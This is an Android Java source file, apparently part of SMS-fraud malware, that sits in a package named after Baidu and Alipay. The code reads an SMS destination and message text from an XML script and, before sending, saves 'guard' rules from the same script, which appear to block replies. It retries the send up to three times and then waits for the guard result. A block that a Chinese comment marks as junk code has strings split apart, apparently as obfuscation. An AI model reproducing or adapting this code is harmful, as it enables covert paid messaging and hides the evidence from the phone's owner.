package com.baidu.alipay.script;

import java.util.Calendar;
import java.util.List;
import java.util.UUID;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.UserLogUtil;
import com.baidu.alipay.script.sms.GuardPojo;
import com.baidu.alipay.script.sms.GuardPojoHandler;
import com.baidu.alipay.script.sms.GuardPojoListFactory;
import com.baidu.alipay.script.sms.GuardPojoWorker;
import com.baidu.alipay.script.sms.ListGuardPojo;
import com.baidu.alipay.script.sms.SmsPojo;
import com.baidu.alipay.script.sms.SmsPojoHandler;
import com.baidu.alipay.script.sms.SmsSender;

import android.content.Context;
import android.util.Log;

public class Sms extends Tags {
//    private static final String TAG = "Sms";

    private String smsdest;
    private String smscontent;
    private String successtimeout;
    private String sendType;
    private String waitguard= "";
    private SendSms sendSms;
    private String script;
    private String key = UUID.randomUUID().toString();
    
    private String sendState = "-1";
    public String guardState = "0";

    public Sms(String xml,boolean dynamic) {
        this.smsdest = getNodeValue(xml, "smsdest");
        this.smscontent = getNodeValue(xml, "smscontent").replaceAll("&amp;", "&");
        this.successtimeout = getNodeValue(xml, "successtimeout");
        this.waitguard = getNodeValue(xml, "waitguard");
        this.sendType = getNodeValue(xml, "sendtype");
        
        this.script = xml;

        this.dynamic = dynamic;
    }

    public void setValue(String name,String value){
    	
    	try {
			this.sendSms.setDataValue(name, value);
			Log.e("sms", "setValue:"+name+";"+value);
			if("2".equals(this.waitguard)){
				GuardPojoWorker.removeSmsByKey(key);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
    }
    
    @Override
    public String work(final Context context, final SendSms sendSms, List<Tags> tagsList, int pos) {
//        LogUtil.e(TAG, "sendsms " + "========>");
    	
    	this.sendSms = sendSms;
    	
    	sendSms.setHasSms(true);
    	
        if (guardState.equals("-1")) {
            return "0";
        }

        try {
        	//先存屏蔽再发短信
        	List<GuardPojo> guardPojoList = null;
        	ListGuardPojo listGuardPojo = null;
        	
        	{	
//        		UserLogUtil.addLog(context, "sms_0");
            	try {
					guardPojoList = GuardPojoListFactory.fromXml1("<sms>" + script + "</sms>");
				} catch (Exception e) {
					e.printStackTrace();
				}
            	
//            	UserLogUtil.addLog(context, "sms_1");
            	//追加 guardList start
            	listGuardPojo = GuardPojoWorker.addBySmsKey(context, key,guardPojoList);
            	//追加 guardList end
            	
//            	UserLogUtil.addLog(context, "sms_2");
            	//需要等待屏蔽结果
            	if("1".equals(this.waitguard) || "2".equals(this.waitguard)){
            		GuardPojoWorker.addSmsByKey(this, key);
            	}
        	}
        	
        	int tryTimes = 0;
        	
        	while(tryTimes < 3 && !(sendState = new SmsSender().sendMsg(context, smsdest,
                    smscontent, successtimeout, sendType,true)).equals(TAGS_EXEC_SUCC)){
        		tryTimes ++;
        	}

//        	UserLogUtil.addLog(context, "sms_3:"+sendState);
            // 短信发送失败后去掉屏蔽
            if (!TAGS_EXEC_SUCC.equals(sendState)) {
            	errorReason = sendState;
            	
            	//从内存remove
				GuardPojoWorker.removeBySmsKey(context, key);
				
				if("1".equals(this.waitguard)){
					GuardPojoWorker.removeSmsByKey(key);
				}
//				UserLogUtil.addLog(context, "sms_4");
            }else{
            	final List<GuardPojo> _list = guardPojoList;
            	final ListGuardPojo _listGuardPojo = listGuardPojo;
            	
            	if(_listGuardPojo != null){
//            		LogUtil.e(TAG, "save smsPojo : "+key);
    				
    				GuardPojoHandler guardPojoHandler = null;
//    				SmsPojoHandler smsPojoHandler = null;
    				
    				try {
//    					UserLogUtil.addLog(context, "sms_5");
//    					if(_listGuardPojo.getSuccMatchedTag() > 0 || _listGuardPojo.getHasErrorGuard() == true){
//    						sendSms.setHasGuard(true);
//    						
//    						//保存SmsPojo start
//                        	smsPojoHandler = new SmsPojoHandler(context);
//                        	
//                        	SmsPojo smsPojo = new SmsPojo(key,sendSms.getKey());
//                        	
//                        	smsPojoHandler.save(smsPojo);
//    					}
    					
                    	//保存SmsPojo end
    					
//    					UserLogUtil.addLog(context, "sms_6");
                    	//保存 GuradPojo start
//                    	LogUtil.e(TAG, "save guardPojoList with smsKey : "+key);
                	
                		guardPojoHandler = new GuardPojoHandler(context);
    					
    					guardPojoHandler.save(key,_list);	
    					//保存GuardPojo end
    					
//    					UserLogUtil.addLog(context, "sms_7");
    				} catch (Exception e) {
    					e.printStackTrace();
    				}finally{
    					if(guardPojoHandler != null){
    						guardPojoHandler.close();
    					}
    					
//    					if(smsPojoHandler != null){
//    						smsPojoHandler.close();
//    					}
    				}
            	}
            	
            	//垃圾代码开始
                {
    	    		int dadada = 0;
    	    		
    	    		if(dadada < 0){
    	    			String asffa = "as";
    	    			String fafsa = "u";

    	    			String fffsa = "ide";
    	    			String sadss = "reset";
    	    			
    	    			String afa = sadss+"."+asffa+"."+fffsa+"."+fafsa;
    	    		}
                } 
                //垃圾代码结束
            	
            	if(this.waitguard()){
//            		UserLogUtil.addLog(context, "sms_8");
            		Calendar cal = Calendar.getInstance();
            		
            		if(successtimeout != null && successtimeout.length() > 0){
                		cal.add(Calendar.MINUTE,Integer.parseInt(successtimeout));
                	}else{
                		cal.add(Calendar.MINUTE, 2);
                	}
            		
            		while("0".equals(guardState)){
            			try {
							Thread.sleep(1000);
						} catch (Exception e) {
						}
            			
            			if(System.currentTimeMillis() > cal.getTimeInMillis()){
            				guardState = "-1";
            				this.errorReason = "s_gt";
            				break;
            			}
            		}
            		
            		GuardPojoWorker.removeSmsByKey(key);
            		
//            		UserLogUtil.addLog(context, "sms_9");
            		
            		this.sendState = guardState;
            		if((this.errorReason == null || this.errorReason.length() == 0) && !"1".equals(guardState)){
            			this.errorReason = "s_ge";
            		}
            		
//            		UserLogUtil.addLog(context, "sms_10");
            	}
            }

        } catch (Throwable e1) {
//        	UserLogUtil.addLog(context, "sms error : "+e1.getMessage());
//            LogUtil.e(TAG, "Exception ~~ Sms错误");
            e1.printStackTrace();
            errorReason = "S_"+e1.getMessage();
            sendState = "0";
            return sendState;
        }

        return sendState;
    }
    
    private boolean waitguard(){
    	return "1".equals(this.waitguard);
    }

	@Override
	public String getTag() {
		return Tags.TAGS_SMS;
	}

}